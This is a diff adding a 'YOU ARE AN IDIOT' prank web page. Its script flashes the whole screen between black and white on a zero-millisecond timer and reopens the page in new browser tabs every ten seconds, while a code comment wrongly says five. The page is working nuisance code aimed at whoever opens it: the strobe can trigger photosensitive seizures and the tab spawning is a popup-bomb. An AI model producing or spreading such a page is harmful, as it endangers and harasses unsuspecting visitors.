@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <title>YOU ARE AN IDIOT HAHAHAHAHAHHAHAHAHAHAHAHA!</title>
+ <style>
+ body {
+ transition: background-color 0s ease;
+ }
+ 
+ .teks {
+ position: absolute;
+ top: 50%;
+ left: 50%;
+ transform: translate(-50%, -50%);
+ transition: color 0s ease;
+ font-size: 24px;
+ }
+ </style>
+</head>
+<body>
+ <p class="teks" id="teks">YOU ARE AN IDIOT!
+          HAHAHAHAHAHHAHAHAHAHAHAHA!</p>
+
+ 
+ <script>
+ let warna = true;
+ setInterval(() => {
+ const teks = document.getElementById('teks');
+ 
+ if (warna) {
+ document.body.style.backgroundColor = 'black';
+ teks.style.color = 'white';
+ } else {
+ document.body.style.backgroundColor = 'white';
+ teks.style.color = 'black';
+ }
+ 
+ warna = !warna;
+ }, 0);
+
+ // Membuat tab browser otomatis setiap 5 detik
+ setInterval(() => {
+ window.open(window.location.href, '_blank');
+ }, 10000);
+ </script>
+</body>
+</html>
